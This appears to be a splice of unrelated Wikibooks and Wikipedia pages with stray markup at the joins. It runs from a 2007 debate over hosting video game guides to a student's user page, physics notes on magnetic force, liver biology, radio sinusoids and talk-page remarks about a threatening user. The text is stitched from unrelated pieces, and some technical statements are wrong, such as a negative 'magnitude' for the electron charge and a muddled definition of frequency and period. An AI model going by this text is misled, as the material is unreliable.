:There are a good many things that are worth saying at this point, but in interests of brevity, I will try to focus on some of the most important. First and foremost, even if Jimbo is just &quot;one man&quot;, and is no longer the head of the foundation, he is still highly influential and successful. His input, while certainly not the only reason for it, was a major factor in the explosive growth of wikipedia, and the entire wikimedia culture. Jimbo is just one man, but is input and his comments should be given the utmost consideration and respect. Our project would likely stand to benefit from a more &quot;hands-on&quot; interaction with Jimbo or any of the other board members. 
:Second, videogame guides simply and undeniably are not textbooks and therefore don't belong here. It's not a matter of the WMF reprimanding us if we don't follow our mission, it's a matter of us failing to make our project a better, more valuable resource. When we decide to include things that aren't textbooks, we are failing the project, and we are making Wikibooks less then it could be. We could include all sorts of stuff here, Videogame guides, fiction, essays, etc, but then wikibooks would be reduced to an unfocused mishmash of all sorts of written nonsense.  The fear of punishment should not be our primary motivator, and it should likely not be a motivation at all. The betterment and promotion of the Wikibooks project should be our ultimate goal here, and that goal is not served by the inclusion of non-textbook materials. People can argue about this all day long, but when the dust settles there is one obvious, &quot;right&quot; thing to do here, and we should be bound to follow that path. --[[User:Whiteknight|Whiteknight]] &lt;small&gt;([[User talk:Whiteknight|talk]]) ([[User:Whiteknight/Proposed Books|projects]])&lt;/small&gt; 00:20, 12 March 2007 (UTC)

::There is not one &quot;right&quot; thing to do, because the inclusion or non-inclusion of video game guides is '''not''' an ethical choice. The inclusion or non-inclusion of video game guides solely depends upon one's own opinion about the constituants of an &quot;education.&quot; And, frankly, I see little merit to the claim that an &quot;education&quot; may only consist of academically rigorous &quot;textbooks&quot;, &quot;annotated texts&quot;, &quot;how-to guides&quot;, and texts directly related to &quot;sports....card games, board games....[and] young children's games.&quot;
::To consider Jimbo's words as dogmatic is silly; they are not dogmatic nor should they ever be regarded as dogmatic. Jimbo did help start the Wikimedia Foundation and did help start Wikipedia, but he was never invovled in Wikibooks: he has only made 52 contributions to the project, with only approximately 20 edits to functional or policy-related pages dealing with his intent to rid Wikibooks of video game guides; and a few letters in the mailing list in the first two months and then in June/July 2006. We have been left to do what we can ourselves with policy texts poorly adapted from Wikipedia (go around to the original archives and see how many are &quot;adapted from wikipedi --mav&quot; or something like that) and an inspirational mission to write and give away free textbooks to the world with no promise of profit. That is amazing. But to exclude a whole class of books which, in our modern world, are becoming increasingly necessary,  based on the assertion that they are &quot;non-textbook,&quot; &quot;written nonsense,&quot; or &quot;simply and undeniably [not] textbooks,&quot; is to deny free (as in freedom) texts to a rapidly modernizing world. Why? What is the point? Because some educators might shy away simply because they deem these texts &quot;not educational&quot;? That is the nonsense we are adhering to if we outrightly ban video game-related texts. That should not happen. --[[User:Iamunknown|Iamunknown]] 03:21, 12 March 2007 (UTC)

::Where is that &quot;right thing to do here&quot;?  What exactly is that line?  And why are we really removing video game books from this project?
::If the reason for removing video game books is because they are discussing a commercial product, then all Wikibooks which are about commercial products, not just video games, should be removed as well.
::If the reason for removing video game books is because they don't &quot;appear&quot; as a textbook... well, name a Wikibook that does for that matter.  That gives us [[Organic Chemistry]] and what else?  About 10 other Wikibooks perhaps.  Let's say goodbye to the How-to books and [[Wikijunior]] as well using this criteria.
::And even throughout this whole process, it was the video game walkthroughs that were the real issue here... or perhaps to be more clear, &quot;cheat guides&quot; for video games.  I don't think those do belong here on Wikibooks... I will conceed that.  But what is being expressed here is that video game books based upon the title alone are subject to deletion, regardless of the kind or quality of the content.  It is that point I objected to right in the beginning, and what I'm still arguing about here.  And that these books are being ''speedy deleted'' (at least originally... without even so much as a VfD) on the presumed authority of Jimbo and the Wikimedia Foundation when such a pronoucement was never given in the first place.  Jimbo himself said as much directly to me.  It is that point especially that I have objected to above all.
::There never was community concensus achieved before this content was removed, and that is why I'm making such a fuss about it now when the opposite is being claimed. --[[User:Robert Horning|Rob Horning]] 07:59, 12 March 2007 (UTC)

:::I did not say to treat Jimbo's words as being dogmatic, I certainly don't view it that way. However, I see Jimbo as being experienced in the wiki-world, and highly successful at that. We certainly don't need to agree with Jimbo, or any of the other board members if we choose not to, but it is foolhardy of us to think that outside opinions (especially those of jimbo or the other board members) do not matter and do not warrant our full consideration.
:::The inclusion or exclusion of videogame guides is not an ethical choice, I never said that either. Only one of those two options, however, is in alignment with our stated mission: [[WB:WIW|&quot;Wikibooks is a collection of open-content textbooks&quot;]]. That page does not say that &quot;Wikibooks is a collection of all sorts of non-fiction books&quot;, or &quot;Wikibooks contains a bunch of books, guides, and pamphlets for instruction on all subjects imaginable.&quot; Videogame guides serve ''no educational value'' by any standard, they cannot and never will be used to teach classes, and they are simply not textbooks. It isn't an issue of whether we like them or not. It isn't a question of whether they might bring more traffic to our project.
:::The Wikimania proceedings did not belong here and you, Rob, fought tooth and nail to have them removed. Wikiversity did not belong here, and it was excised (slowly and painfully). Lots of other content is removed regularly, both via VFD and speedy deletion. My point here is that we do not, nor have we ever, been inclusionary. We do not champion free speach, we do not stand against censorship, and we do not host all manner of written material here. There are strict (albeit vague) inclusion criteria that all material on wikibooks must satisfy. We do a disservice to the project by choosing to ignore these criteria, or to bend them for one particular category of content. It is a mistake to assume that wikibooks is some kind of moral crusade for freedom of speach or freedom of the press. We are a textbook authoring community, and things that do not fit in with that purpose are censored and deleted regularly.
:::Even without these guides we still have ''hundreds of appropriate books'', on multiple bookshelves, and an almost infinite pool of subjects on which new books can be written. The removal of videogame guides is not a practical limitation in terms of our content, our contributorship, or our potential. --[[User:Whiteknight|Whiteknight]] &lt;small&gt;([[User talk:Whiteknight|talk]]) ([[User:Whiteknight/Proposed Books|projects]])&lt;/small&gt; 13:05, 12 March 2007 (UTC)

::::I will note that in regards to the Wikimania pages, even the people organizing the content openly mentioned on many places that the content needed to be moved eventually.  And it was permitted to remain on Wikibooks until well after Wikimania was over.  I didn't even really make waves about moving it until it had already been about halfway started in being moved over, so I decided to finish the job, only to have all of my edits (and deletions) reverted by Brion Vibber and direct threats against me by both e-mail, my personal talk page, phone calls, IRC, an finally on the Staff Lounge, where I insisted the discussion had to occur.  That the main organizer of the Wikimania proceedings decided to step completely out of the normal process of filing a complaint on [[Wikibooks:Votes for undeletion]] and instead got Brion Vibber to undelete the content, and got both Angela and Anthere on my case is also testament to the fact that something was seriously wrong.  I stood up to them.  Thank goodness (in this case) the rest of the Wikibooks communty was behind me on this issue.  Otherwise I'm sure I would have been blocked and banned.  The personal attacks in that episode against me were simply unreal, and what is currently seen on the Staff Lounge archives only hints at what was said.  --[[User:Robert Horning|Rob Horning]] 04:37, 16 March 2007 (UTC)

== Bringing back older discussion points ==

There is a myopic view that this whole issue about hosting video game books was something that was initiated by Jimbo Wales.  That is hardly the case, and to prove this point, I'm [http://en.wikibooks.org/w/index.php?title=Wikibooks:Game_textbook_guidelines&amp;oldid=304182 restoring an earlier discussion] that went into detail about pros and cons of allowing video game books on Wikibooks.  These points and counter points were made in several places, but I think this does the absolute best job of showing the stronger arguments on both sides of the debate.

Unfortunately, this page is buried in the ancient archives of Wikibooks, and it is for this reason that I'm sweeping the dust off for this document that was last edited on December 2005 (a couple of months ''before'' the infamous letter by Jimbo about this topic).  --[[User:Robert Horning|Rob Horning]] 08:44, 12 March 2007 (UTC)

Wikibooks will either permit or reject game manuals such as the ones on [[Wikibooks:Games bookshelf]] and [[Wikibooks:Computer and video games bookshelf]]. '''Discuss at [[Wikibooks talk:Game manual guidelines]].'''
* If it permits game manuals, then this page will be guidelines for them.
* If it rejects game manuals, then it would change [[Wikibooks:What is Wikibooks]] so that the rejection is enforced policy. This page will be guidelines for how to move game manuals away from Wikibooks.

In addition to using the talk page, you can now edit the sections below, which contain arguments for and against game guides at Wikibooks.

==== For (Wikibooks should include game guides) ====
* Game strategy guides qualify as '''how-to guides''', and Wikibooks [[Wikibooks:How-tos bookshelf|includes those]].
* Wikibooks should include instructional material, including game guides, even if it can only be read outside of school.
* '''Wikicities is not a sister project''' of Wikibooks, so it is incorrect to imply that because Wikicities exists, we should move game guides from Wikibooks to Wikicities.
* Related to the above point, there is no other Wikimedia sister project other than Wikibooks that would be able to host game guide content, baring the possibility of creating a whole new Wikimedia sister project exclusively for this sort of content.
* Potential contributors can use the guides to '''become familiar with how to edit Wikibooks'''. Some contributors might be less afraid of damaging a game guide, rather than the calculus textbook.
* The game guides can '''attract readers''' to Wikibooks who might become contributors to other parts of Wikibooks.
* Some games are '''studied in schools''', especially [[Chess]]. Also, schools for video game developers study existing video games.
* College major areas of study include video game theory and game design in some Universities.  Some Game Design courses include:
**[http://www.gamedegree.com/ UAT bachelors degree in Video Game design]
**[http://www.fullsail.com/index.cfm/fa/landing.gamedesignschool/mnc/25/game-design-school Full Sail Game Design Major] (BTW, 1st major univserity to offer game design major)
**[http://www.stanford.edu/class/sts145/ History of Computer Game Design at Standford University]
**[http://www.newport.ac.uk/amd/ug/cata.htm University of Wales Computer Game Design Major]
**[http://www.animationarena.com/majoring-in-video-game-design.html Discussion of a Master's Degree in Video Game Design at Southern Methodist University]
**[http://gdiac.cis.cornell.edu/contact.html Video Game Design Curriculum at Cornell University]
* Wikibooks '''should include sports''' because many schools have sports teams.
* Many schools have extracurricular activities for groups of gamers. Some '''student government associations recognise''' these gaming groups.
* '''Wikipedia includes games''', so Wikibooks should too.  If a Wikipedia article exists, it ought to be reasonable to make a NPOV Wikibook on the same subject, given enough source material to work with to add enough content for a full book-length project.
* '''Students want to learn games.''' Wikibooks should include game guides so that these readers are satisfied.
* Game guides will '''help in the future''' the growth of Wikibooks. (Including game guides simply makes Wikibooks larger.)
* It would be '''difficult to remove or transwiki''' a potential of 2 bookshelves, [[Wikibooks:Games_bookshelf | Games Bookshelf ]] and [[Wikibooks: Computer and video games bookshelf | Computer and video games bookshelf]]
* German Wikibooks chose [[:de:Go]] as '''book of the month'''. Other games at Wikibooks in other languages:
** [[:fr:Solution, truc et astuce de jeu vidéo]] ''video games''
** [[:de:Regal Diverse#Spiele]] ''games''
** [[:de:Regal Sport]] ''sport''
* Bandwidth issues for hosting and serving Game Guide content really is trivial and elimination of all game guides is not going to make much of an impact on server performance for any Wikimedia project.
* Gaming guides and Wikijunior are two relatively isolated development groups so there is not going to be any real impact on Wikijunior regardless of what decision is made on gaming guides.  Besides, future directions of Wikijunior are going to open up a seperate domain like http://www.wikijunior.org that is already live.  It is more likely that kids are going to start on Wikijunior and then discover the gaming guides later, especially given the limited content on Wikijunior at the moment.
* The actual transwiki (if it takes place) would be a minor inconveniance compared to the '''backlash of the readers and editors''' when they find out they are no longer welcome here.

==== Against (Wikibooks should exclude game guides) ====
* Game guides are '''random guides on a subject that someone likes''' (see [[WB:WIW#What Wikibooks includes]]) so they are not allowed at Wikibooks.
* '''It doesn't matter if the games themselves are on Wikipedia'''. That is an encyclopaedia, this is not. The most editing article on WP is George W. Bush. Do we need a Wikibook on how to become the U.S. President? There is an article on Ann Coulter. Do we need a Wikibook on ''How to Talk to a Liberal (If you Must)''? Just because something is germane to WP does not make it germane for WB.
*Yes, classes may be offered on video game design, but a textbook for those classes would '''not include multiple complete walkthroughs and cheat codes'''. Maybe one or two examples within a larger [[video game design]] book, but not one for every game available.
* '''Entertainment is not academic.''' Because game guides instruct the reader in how to entertain oneself, they cannot qualify as academic, which makes them less useful for Wikibooks. (Instructing the reader to entertain ''others'' might be academic. Game development instead of game strategy.)
* The game guides '''waste bandwith'''. Excluding them would reduce the stress on the Wikimedia servers.
* Game guides '''harm Wikijunior''' because  children may read them instead of [[Wikijunior]].
* There is '''no school class for videogame strategy''' anywhere. So Wikibooks cannot allow video game guides, even if its allows other game guides.
* Game guides '''reduce the standard of Wikibooks'''. Removing all game guides would reduce the scope of material on Wikibooks, which would have several benefits. Wikipedia would be discouraged from moving material to Wikibooks during &quot;articles for deletion&quot;. Contributors would have more interest in Wikibooks because Wikibooks would be more academic.
* Moving game guides to Wikicities would '''help Google ads fund Wikicities'''. Though Wikicities is not a Wikimedia project, some Wikibooks contributors are also Wikicities contributors who support both Wikibooks and Wikicities.
* '''There are other places to go''' if you want to find video game guides.
* '''Just because something is easy, does not make it right.''' People claim the sheer difficulty of transwikiing an entire bookshelf should stop it from being done. Cleaning up after vandals is hard, should we just stop doing that too? Also, one can use [[Special:Export]] and [[Special:Import]] to help in transwiki.

==== Double-edge Arguments (Arguments that can be viewed to support either side) ====
{|border=&quot;1&quot; cellpadding=&quot;2&quot;
|For game guides|| Against game guides
|-
|Gamers would be isolated if Wikibooks looked more academic
|Other Contributors would have more interest in Wikibooks because Wikibooks appear to be more academic.
|-
|Wikibooks should have both Wikiversity books and game guides
|Game guides might encourage Wikiversity to separate from Wikibooks (search [[MetaWikipedia:No to Wikiversity]] for GTA:SA)
|-
|Add '''For''' argument here
|Add '''Against''' argument here
|}

----
Here is a quote of [[User:Aya]] on [[Wikibooks talk:Policies and guidelines]]. One could argue that this is the appropriate location for game guides, or that they should be moved to yet another wiki.

''It all started with the project now hosted at en.wikipedia.org. The idea being to collaboratively create a generalized encyclopedia with no (apparent) limitation on its scope. ... At some point, someone (perhaps Jimbo?) decided this was going to get in the way of creating an encyclopedia, so a number of other Wikimedia projects were set up, in the hopes that this data could be transferred to a more appropriate location. ... Over time, some content was transferred, while some was not. Since each project had its own 'what &lt;project&gt; is/isn't' page, users changed its scope over time as well. The endless cycle continues today:''

# ''Create a new wiki
# ''Create a badly-defined scope
# ''Fill it with inappropriate content
# ''When it becomes unmanagable, goto 1''

=== Alternate wikis ===
* Even if Wikibooks accepts game manuals, a good alternate wiki for game manuals might be [[wikicities:c:gameinfo]].
* Encyclopedia articles about games are found at Wikipedia, for example [[w:Go (board game)|Go]] and [[w:Super Mario Bros.|Super Mario Bros.]].

Shouldn't this rather be:

&quot;A balanced binary search tree according to the following specification: The height difference between any two '''leaf''' nodes must not exceed one.&quot;

Note that any two sibling nodes always have the same parent and are on the same level, so the height difference between them will never exceed zero.

      <text xml:space="preserve">'''Welcome''' to my incredibly mundane and non-exciting userpage! Basically, all I know how to do on Wikipedia is edit pages. Not create them. I know how to fix links and correct grammar, and put words in ''italics''. WOW!

Basically, I roam around various articles and make sure they are looking alright, and don't have horrible lies written all over them, which sadly I have seen too often. So, this userpage is rather basic and boring about my life on Wikipedia, and the few things I decided to add.

=Background=

Here's some lame background about me. I'm a senior in highschool at a boarding school in the middle of Nowhere, Western Mass. OK, so everyone tells me that the city I'm next to is awesome, but apparently that's only if you're old enough to drink and go to nightclubs, and, well, I'm not. So its pretty lame. I grew up right ouside of Boston, so even moving to the other side of the state ruins my life. I hate my roommate, and since I don't think she'll ever find this page, I'll come out and say it. During studyhall, I'm not allowed to listen to music to distract myself from the very obnoxious noises she makes, and phone calls she's not supposed to be making (or answering), so I try to find the one page my school's internet server hasn't blocked. And, Wikipedia is it. Well, they didn't block Amazon or Ebay either, but I really have nothing to buy, and I'm way too poor. So, that is how I landed on Wikipedia and started my trail of edits and freakish obsession with Userboxes.

===Origin of &quot;Yunaresuka&quot;===
The name &quot;Yunaresuka&quot; comes from the character Yunalesca from Final Fantasy X. I liked the character's name, but not how it was spelled, so I opted for the Japanese pronunciation (of ユウナレスカ). However, the name has nothing to do with Yunalesca at all, and after awhile it has just become username I like to have. However, in an attempt to avoid copyright laws later in life, I sometimes use the name My Sushi Harakiri, which has a whole nother origin.

=Interests=

Some of my interests, in case you'd like to bond with me, are Japanese, guitar, video games (especially RPGs like Zelda and Kindgom Hearts, and others like Guitar Hero), food, comic books, music, movies, Pimp My Ride, CSI, and My Chemical Romance. Right now I'm reading ''Absolute Boyfriend'' which is freakishly awesome, and the third book really won't come out soon enough. I'm also reading the ''Gossip Girl'' books, and I've lost track of which book is coming out next. I can't wait for the next Spiderman movie to come out, as well at Ghost Rider. The Superman movies are among my top favorites (both the Christopher Reeves and Brandon Routh movies), I still have to see the Punisher movie, but I'm wearing the sweatshirt my brother gave me to keep the faith.

If you want to start up a conversation, the things I know most about are comic books, video games, and My Chemical Romance. Growing up with two brothers and a weird sister makes you very much a tomboy, so comics and video games ruled my life. And MCR because, well, I'm obsessed. There's really no other way to put it other than ''I'm obsessed.''

=Articles=

So far I haven't edited any Wikibooks yet, as I spend most of my time in the main Wikipedia articles.

L is the length of conductor in the magnetic field measured in metres

B = F/IL   This defines flux density, B.

We can measure F using the current balance.

If the current cuts across the magnetic field at the angle θ then the component the current across the field is ISineθ and therefore -

'''F= B I L sinθ'''

θ is the angle the current makes with the magnetic field.

F (force) is at its maximum when θ = 90 degrees, F = 0 when the current is parallel to the field lines. i.e., θ = 0 degrees.

Use Fleming's left hand rule for the direction of motion.

==Magnetic Force on a moving charge==

F=BIL

= BQL/T= BQV

The SI unit for charge, Q, is coulombs - C.

If charge moving at right angles to the field

F = -Bev for an electron        ( e = charge on an electron)

Remember that the direction of conventional current is opposite to that of the electron.

The magnitude of an electron charge is -1.6x10-19

==Orbiting charges==

F is always perpendicular to the path of the charged particle, so the particle moves in a circular path.

Therefore, centripetal force =  mv²/R = BeV

Radius of path =  R = mv/Be

==Parallel Current Carrying Conductors==

F/l=k (I&lt;sub&gt;1&lt;/sub&gt; I&lt;sub&gt;2&lt;/sub&gt;)/d

Where F = Force; Newtons N

l = Length of the current carrying conductors parallel to each other.

k = constant; mu0/2p = 2 x 10-7 SI Units

I&lt;sub&gt;1&lt;/sub&gt; and I&lt;sub&gt;2&lt;/sub&gt; are current carrying conductors respectively

d = distance between the current carrying conductors (mm)

==Quick note==

Radius is large for more massive, faster particles
Radius is smaller when the magnetic field strength is large

===Blood Supply===

There are two different blood vessels arriving at the liver - the '''hepatic artery''' and the '''hepatic portal vein'''. The hepatic artery supplies the liver with oxygen and comes from the aorta. The hepatic portal vein leads from the small intestine with blood rich in absorbed nutrients. Blood coming from the small intestine is at a much lower pressure than in the hepatic artery and is de-oxygenated. The '''hepatic vein''' carries blood away from the liver to the vena cava which transports it back to the heart. 

See external link for image of liver and associated organs: [[File:Digestive system showing bile duct.png|thumb]]


===Study of liver tissue===

The human liver can contain up to 100 000 '''lobules'''. A lobule is a small division of the liver defined at the histological scale - between them lie the branches of the hepatic artery and the hepatic portal vein, with blood flowing through the lobules and then into the branch of the hepatic vein.

The lobules are composed of '''hepatocytes''', which make up 70-80% of the mass of the liver.These cells are involved in protein synthesis, protein storage and transformation of carbohydrates, synthesis of cholesterol, bile salts and phospholipids, and detoxification. The cells are arranged in rows that come out from the hepatic vein which is the centre the rows of hepatocytes are thin - never more than two cells thick so that blood is in close contact with the hepatocyte cells. Channels between these cells carrying blood are called '''sinusoids''', and some channels called '''bile cannaliculi'''. Bile coming from the bile cannaliculi enters the bile duct.

Large, phagocytic macrophages called Kupffer cells line the sinusoids, and their role is to destroy bacterium that have made it into the liver, quickly killing via phagocytosis any bacterium.

Please see external image for illustration of the above: [http://www.biologymad.com/Kidneys/liverlobule.jpg]

== Carbohydrate &amp; Lipid Metabolism/Synthesis in the Liver ==

===Carbohydrates===

The liver closely works with the pancreas and adrenal glands to control blood glucose levels. '''Insulin''', '''glucagon''' and '''adrenaline''', the first two of which are secreted by the pancreas and the last secreted by the adrenal glands affect the way the liver metabolises carbohydrates.

Glucose, a monosaccharide is our way of transporting carbohydrates in the blood. Glucose serves as a main respiratory substrate, but is not suitable for storage. The polysaccahride glycogen is a much more appropriate storage sugar and thus when there is more glucose in the blood than required (for example, just after eating), it is converted to glycogen and stored in a number of places.

When blood glucose levels fall (for example, during exercise), α (alpha) cells in the islets of Langerhans (cells in the pancreas) secret glucagon. Glucagon binds to the glycoprotein receptors on each hepatocyte cell in the liver lobules and starts a process called glycogenolysis. This process simply means 'breaking down glycogen' and the resulting glucose passes out of the hepatocyte, into the blood in the sinusoids and helps raise blood glucose levels back to normal.

When blood glucose levels are too high, β (beta) cells in the islets of Langerhans perform what is essentially the reverse of the above process. They secrete insulin, a hormone that acts on hepatocytes, muscle and fat-containing cells in adipose tissue and stimulates them to convert glucose into glycogen. This lowers the blood glucose levels back to normal. 

As a side note, the hormone adrenaline, usually released during times of danger, has many other uses but in the liver it breaks down glycogen to provide glucose to the muscles - to help the person escape whatever danger they are in.


====Conversion of other substances to glucose====

The liver can also convert a variety of other substances to glucose, during periods of low glucose levels in the blood, creating additional energy for the body, in a process called '''gluconeogenesis'''. This process occurs (in normal circumstances) when all supplies of glycogen have been converted to glucose (i.e. in the beginning stages of starvation). It starts by converting amino acids to glucose, '''deaminating''' them first (See section: Protein Metabolism) and excreting the nitrogen containing section of the amino acid in urea and the rest is converted to '''pyruvate''' which is used to be converted to glucose.

During exercise, anaerobic respiration may start to occur as the muscles require more oxygen than the blood can supply it with - this produces '''lactate''' which is taken in by the hepatocytes, and again converted to pyruvate and then glucose. Glycerol, a key part of lipids can also be converted to glucose.

===Lipids===

Lipids are stored in cells that make up adipose tissue - lipids are an important energy-storage compound. Fats can be used to synthesise '''ATP''', an important energy source in humans - even whilst glucose levels in the blood are high, and it may surprise you to learn that most tissues (except nervous tissue and red blood cells - these cells must use glucose) will utilise fatty acids as their primary respiratory substrate. Fatty acids are used more and more if glucose is in short supply. 

In the liver, triglyceride molecules are split into glycerol and fatty acids, the latter of which is converted into acetyl coenzyme A - used in the Krebs cycle to produce ATP. The less glucose available, the more this happens - and any excess acetyl coenzyme A can be converted to acetoacetate and released into the blood, since the liver cannot use it, but many other cells in the body can - they convert it to acetyl coenzyme A and feed it into the Krebs cycle.

Above, we discussed breaking down fat to utilise as an energy source - but the '''synthesis of triglycerides''' is also performed by the liver - excess sugars and proteins are converted to fat. Once this has happened, they are combined with protein to form '''lipopoteins''', which can be transported to other parts of the body. Lipids are insolouble (cannot be transported in the blood), and the protein of the lipoprotein consists of a shell of polar lipids and proteins. Importantly, lipoproteins can be either high or low density - the importance of which becomes clear in the next section.

The liver also makes cholesterol. This is an extremely important molecule in the body - don't believe all the bad press it gets! Not only is it an essential part of cell membranes (stability, fluidity and relative impermeability to hydrophilic substances), but it also is involved in the synthesis of steroid hormones, and is deposited in the skin to waterproof it. Vitamin D is synthesised from cholesterol, stimulated by UV light from the sun. All this, and it makes bile salts.

The liver also regulates levels of cholesterol, which is present in meat, eggs &amp; dairy products (dietary cholesterol intake). When we receive this cholesterol intake, the liver decreases the rate at which it synthesis cholesterol. This happens as a result of the dietary cholesterol reducing the activity of one of the enzymes that catalyses the synthesis of cholesterol from acetyl coenzyme A. Saturated fats cause the liver to increase the rate at which it converts those to cholesterol, which is why people are told to keep saturated fat levels in the diet to a low level.

Just as with triglycerides, cholesterol must be transported as a lipoprotein. High density lipoproteins and low density lipoproteins can be formed, but it has been observed that is the proportion of HDL to LDL that has a far greater effect on health - LDLs are the bad guys here, causing deposition of cholesterol on blood vessel walls as plaques (causing high blood pressure, heart attacks), whilst HDLs have been shown to remove plaques and protect against them in the first place.


===Bile Production===

Most of the cholesterol synthesised by the liver in the processes above is used by the heaptocyte cells to make bile. This is then secreted into the bile cannaliculi which then carries some bile into the bile duct (which secretes into the duodenum. The rest of the bile is carried into the gall bladder where it is stored and concentrated before being released.

Whilst water makes up a lot of bile, another major component is bile salts, made from cholesterol. These emulsify fats, make it easier for them to be hydrolysed by the lipases and thus absorbed in the smal intestine. Bile also contains cholesterol, which under normal circumstances combines with bile salts to form water-soluble particles but sometimes it may precipitate out and form gallstones. Gallstones are a serious medical condition which can prevent bile from flowing into the small intestine, causing problems with the digestion of fats. Gallstones can be removed by ultrasound treatment or by surgery.

Bile also contains breakdown products from red blood cells which are broken down in the spleen. The haem group is spilt into iron and bilirubin whilst the globin part is hydrolysed to individual amino acids.

== Protein Metabolism/Synthesis ==

Protein metabolism is performed in the hepatocytes, converting and deaminating amino acids. The liver also makes proteins - including important blood proteins such as albumin, globulins and fibrinogen.

====Transamination====

This is the conversion of one amino acid to another. The essential amino acids - the ones we can only obtain from our diet cannot be formed in this way but the remainder of the 20 can be converted to another if our diet does not match our body's requirements.

====Deamination====

Liver cells are able to turn excess amino acids into carbohydrates and fats by removing the nitrogen containing part of the molecule, in a process called '''deamination'''. This nitrogen containing part is '''ammonia''' which, with energy from ATP is combined with carbon dioxide to form urea in the ornithine cycle. The remainder, the carbon-containing part can be converted into carbohydrates or fats, respired or stored.

===Synthesis of Plasma Proteins===

Blood contains many proteins dissolved in '''blood plasma''' - all of which are obviously soluble proteins. These are the plasma proteins and are nearly all made in the liver. Two important plasma proteins are '''fibrinogen''' and '''prothrombin''' - these proteins are used in blood clotting. 

When blood vessels are damaged, the collagen fibres in the walls are exposed and this activates platlets and causes the conversion of prothrombin (an inactive protein) to an active enzyme called thrombin. '''Thrombin''' catalyses the removal of amino acids from fibronogen molecules, which in turn converts it to a polymerise (a form inwhich many molecules can link together), forming '''fibrin''', an insoluble long chain that tangles up and forms a mesh to trap red blood cells - preventing blood from escaping and stopping the entry of pathogens from the outside world.

'''Globulin''', which is the term for most of the golbluar proteins in the blood plasma, some are antibodies but these are made by the cells of the immune system. The other globulins are made by the liver and many of them are transport molecules combining with other molecules for transport - for hormones such as insulin.

'''Albumin''' is abundantly available in blood plasma and it's job is to stop too much water leaving the blood and entering tissues. It is too large to pass through the walls of most capillaries. 

===Formation of tissue fluid===

The rate at which tissue fluid is formed is determined by two things. Firstly, relative hydrostatic pressure in the capillary and tissue fluid, which the capillary pressure always being greater, so that the difference tends to push water out of the capillary and into the tissue fluid. The opposing force to this is the solute potential gradient between the blood and tissue fluid. This is where albumin comes in - since it is too large to pass through the walls of capillarys, it maintains a lower solute potential for the blood, making water move from the tissue fluid to the blood. If not for albumin, the solute potential gradient would be overwhelmed by the hydrostatic pressure gradient, and water would build up in the tissue fluid. This is a condition known as oedema and is responsible for the swollen belly of a child suffering from kwashiorkor (a protein deficiency disease).

== Detoxification ==

Many things we ingest are potentially dangerous to our body but the liver breaks them down before they harm us - some excreted in the bile, some broken down into harmless substances. The majority of this process occurs on the smooth endoplasmic reticulum in the hepatocyte cells.

===Metabolism of Ethanol===

Ethanol molecules are small, lipid-soluble and toxic - meaning it can easily diffuse across membranes and enter cells, and it is the livers job to break it down and make it harmless. Ethanol is first converted to ethanal by the enzyme '''alcohol dehydrogenase''', and then to ethanoate by aldehyde dehydrogenase. This can then enter the Krebs cycle and be metabolised to produce ATP - providing a source of energy.

However, if large quantities of alcohol are consumed regularly then the tissues within the liver become damaged. This is due to the breakdown of ethanol producing reduced NAD, reducing the likelihood of reactions needing oxidised NAD occurring. Reactions like this include oxidation of fatty acids, meaning they will accumulate, being stored in the hepatocytes, severely affecting their efficiency at carrying out their function. This is known as a 'fatty liver'.

These effects, combined with the direct toxicity of alcohol on liver cells leads to a condition known as cirrhosis in the liver, where liver cells are just destroyed by ethanol, and while replaced, the cells that replace them have far too much fibrorous tissue (scar tissue) and lose proper blood supply structure. This leads to blood bypassing the filtering process and going on with toxins (and possibly bacteria) in it. All the liver's functions are impaired, for example converting ammonia to urea fails to be as efficient as before, causing ammonia to build up in the blood and cause damage to the central nervous system, which can be fatal.

===Breakdown of other substances===

Hormones are released from various places in the body and although not directly harmful, they must be broken down by the liver to prevent them causing their effects indefinitely (which could be harmful). Examples of these would include testosterone, thyroxine and oestrogen. Also, medicinal drugs must be broken down for the same reason. The breakdown products of these substances is eliminated via the kidneys in filtration. The liver converts lipid soluble molecules to water soluble ones so that they can stay in the nephron fluid and be carried to the bladder and be lost.

      <text xml:space="preserve">As mentioned in the previous chapter, an alternating current is a current that changes with time.  A specific class of current, and voltage for that matter, is the sinusoidal waveform.  Sinusoidal waveforms are fundamental to radio.  A Morse code signal, for example, is generated from a sinusoidal waveform.  Sinusoidal waveforms are the basis behind AM, FM, and television signals as well.

==Basic Characteristics of Sinusoidal Waveforms==

There are three basic characteristics of sinusoidal waveforms (hereafter sinusoids): amplitude, frequency, and phase.

[[image:Sinus_amplitude_en.svg|left|A basic sinusoid]]  As shown in the diagram, the amplitude is the difference between the high value and the low value.  The waveform may have different units, depending upon what the waveform is.  If the waveform is measuring a voltage as a function of time, then the amplitude will be in Volts; if it were current as a function of time, amplitude would be in Amps.  The frequency is equal to &lt;math&gt;\frac{1}{\lambda}&lt;/math&gt; and is a measure of how quickly the waveform cycles.  If the waveform is a function of time, then frequency will usually be measured in Hertz (Hz).  Since frequency is a measure of how rapidly the waveform cycles, frequency is sometimes (usually in older texts) given as cycles.  One cycle is equal to one Hertz.  λ is the inverse of frequency and is referred to as the period (usually a &quot;T&quot; is used to indicate the period.)  Phase is a measure of how &quot;offset&quot; the signal is from some reference signal.  Phase only makes sense when comparing signal of the same frequency, as otherwise phase will change as a function of time.  [[image:Sine_cosine_plot.svg|left|300px|Comparing sine and cosine waves.]]  In the second plot, red is a sine wave and green is a cosine wave.  As can be seen, these waveforms are identical save that one is a shifted version of the other.  Notice how the cosine function reaches a peak at 0, while the sine function reaches a peak at &lt;math&gt;\frac{\pi}{2}.&lt;/math&gt;  The cosine function reaches the peak sooner and is said to lead the sine function by &lt;math&gt;\frac{\pi}{2},&lt;/math&gt; or 90°.

Many people in Islamic countries also see a broader and positive role for Islam in Politics . Political Islam is powerful in all Muslim-majority countries. Islamic parties in Turkey, Pakistan and Algeria have taken power at local, provincial and even Federal level.

This user left me a pretty threatening message on my user-page. I would have banned him outright, except his contribution history has some good stuff as well. --{{User Whiteknight Sig|Whiteknight}} 02:39, 12 December 2005 (UTC)

:[http://en.wikibooks.org/w/index.php?title=User_talk:Whiteknight&amp;diff=next&amp;oldid=305960 This diff] suggests that 203.166.96.''239'' was responsible. The [[Special:Contributions/203.166.96.239]] suggests that several different users occasionally use this IP. --[[User:Kernigh|Kernigh]] 04:40, 20 February 2006 (UTC)

He wrote [[An Anarcho-Primitivist's Guide To Sabotage]], a new Wikibook that is a recreation of some previous books like [[Causing Havoc]].  This is just a thing to watch very closely, perhaps with users like this who want to keep adding books like this to Wikibooks with repeated VfDs coming down to remove this sort of content.  --[[User:Robert Horning|Rob Horning]] 08:19, 8 February 2006 (UTC)

